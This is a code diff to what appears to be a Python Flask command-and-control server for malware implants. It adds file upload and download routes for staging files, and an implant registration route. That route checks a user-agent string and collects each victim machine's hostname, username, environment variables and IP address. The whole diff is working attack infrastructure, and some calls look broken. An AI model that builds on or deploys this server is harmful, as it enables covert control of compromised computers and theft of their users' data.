@@ -10,6 +10,7 @@ from multiprocessing import Process
 import requests 
 from app.app import createFlaskApp
 import uuid
+from werkzeug.utils import secure_filename
 
 
 """控制端表"""
@@ -19,11 +20,36 @@ lock = mp.Lock()
 implant_lock = mp.Lock()
 TASKS = []
 AGENTS = []
-path = "data/listeners/{__name__}/"
 
 createflask = createFlaskApp()
 app = createflask.create_app()
 encryptionkey = None
+
+
+@app.route("/upload/<filename>", methods = ["POST"])
+def upload_files(filename):
+#from flask documentation
+    if request.method == 'POST':
+        path = "data/listeners/{__name__}/"
+        if os.path.exists(path) == False:
+            os.mkdir(path)
+        app.config['UPLOAD_FOLDER'] = path
+        print("make sure your file exists and is in the correct directory")
+        if 'file' not in request.files:
+            Flask.flash('No file part')
+            return Flask.redirect(request.url)
+        
+        file = request.files['file']
+        if file and file.filename != '':
+            filename = secure_filename(file.filename)
+            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
+            print('successfully uploaded file')
+            return ''
+    return ''
+        
+@app.route('/downloads/<filename>', methods = ["GET"])
+def download_file(filename):
+    return request.send_from_directory(app.config["UPLOAD_FOLDER"], filename)
 
 
 @app.route("/tasks", methods=["GET"])
@@ -60,17 +86,22 @@ def add_request():
 
 @app.route("/register", methods=['POST', 'GET'])
 def addAgent():
-    implant_id = str(uuid.uuid4())
-    fromimplant = request.get_json()
-    guid = fromimplant['guid']
-    hostname = fromimplant['hostname']
-    username = fromimplant['username']
-    implant_ip = request.environ['REMOTE_ADDR']
-    print(fromimplant, implant_ip, implant_id)
-    encryption_key = encryptionkey()
-    #agent = agents(implant_id, guid, hostname, username, implant_ip, encryptionkey)
-    #addtodatabase(agent)
-    return jsonify(encryption_key)
+    user_agent = request.user_agent
+    if (user_agent == 'authenticated'):
+        implant_id = str(uuid.uuid4())
+        fromimplant = request.get_json()
+        guid = fromimplant['guid']
+        hostname = fromimplant['hostname']
+        username = fromimplant['username']
+        environment_variables = fromimplant["enviroment_variables"]
+        implant_ip = request.environ['REMOTE_ADDR']
+        print(fromimplant, implant_ip, implant_id)
+        encryption_key = encryptionkey()
+        #agent = agents(implant_id, guid, hostname, username, implant_ip, encryptionkey)
+        #addtodatabase(agent)
+        return jsonify(encryption_key)
+    else:
+        return jsonify("you're not authorized >:(")
 
 def encryptionkey():
     #if encryptionkey == None:
